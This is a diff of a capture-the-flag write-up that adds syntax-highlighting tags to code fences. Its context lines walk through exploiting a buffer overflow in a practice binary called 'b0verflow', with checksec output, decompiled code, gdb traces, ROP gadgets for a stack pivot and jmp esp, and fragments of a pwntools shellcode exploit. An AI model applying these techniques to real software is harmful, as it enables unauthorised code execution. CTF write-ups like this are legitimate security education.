@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file b0verflow
 b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
 $     pwn checksec b0verflow
@@ -31,7 +31,7 @@ So we can see that we are dealing with a `32` bit dynamically linked binary, wit
 
 When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 void main(void)
 
 {
@@ -42,7 +42,7 @@ void main(void)
 
 So we can see that it essentially just calls the `vul` function, which does this:
 
-```
+```c
 undefined4 vul(void)
 
 {
@@ -66,7 +66,7 @@ So we can see that it prints out some text. Then it scans `0x32` (`50`) bytes wo
 
 So we can overwrite the return address (seeing where the start of our input is in comparison to the saved return address is, we can see that the offset is `0x24` bytes since `0xffffd11c - 0xffffd0f8 = 0x24`):
 
-```
+```gdb
 gef➤  b *0x804857a
 Breakpoint 1 at 0x804857a
 gef➤  r
@@ -138,13 +138,13 @@ Stack level 0, frame at 0xffffd120:
 So the question is, what will we call. PIE isn't enabled, so we can call gadgets from the binary. At the moment we don't have a stack or libc infoleak. The gadgets from the binary won't be enough to pop a shell on it's own, however it will be enough to call shellcode on the stack without a stack infoleak:
 
 Stack pivot gadget:
-```
+```console
 $    python ROPgadget.py --binary b0verflow | grep "sub esp"
 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
 ```
 
 Jmp esp gadget:
-```
+```console
 $    python ROPgadget.py --binary b0verflow | grep "jmp esp"
 0x08048504 : jmp esp
 ```
@@ -152,7 +152,7 @@ $    python ROPgadget.py --binary b0verflow | grep "jmp esp"
 So we will call the Stack pivot gadget first, then the `jmp esp` gadget. The stack pivot gadget will move the stack pointer down to our own input. It will leave off by executing the first DWORD of our input as an instruction pointer. That instruction pointer will be the `jmp esp` gadget. When that instruction is executed, the `esp` pointer will point to the new DWORD, which will be the second `4` bytes of our input. We will store our shellcode there, which will be executed by the `jmp esp` gadget. Let's take a look at how these gadgets operate:
 
 We start off with the stack pivot gadget:
-```
+```gdb
 0x080484fd in hint ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -198,7 +198,7 @@ $1 = (void *) 0xffa29750
 
 We can see that the `esp` register is equal to `0xffa29750`. We can see that it decrements the value of the `esp` register by `0x28` (`0x24` from the sub, `0x4` from the pop):
 
-```
+```gdb
 0x08048503 in hint ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -251,7 +251,7 @@ gef➤  x/2i 0x8048504
 
 We can see that `esp` points to our `jump esp` gadget at the start of our input.  
 
-```
+```gdb
 0x08048504 in hint ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -312,7 +312,7 @@ We can see that when the `jmp esp` gadget is ran, `esp` points to our shellcode 
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 from pwn import *
 
 # Establish the target process
@@ -348,7 +348,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './b0verflow': pid 18753
 [*] Switching to interactive mode
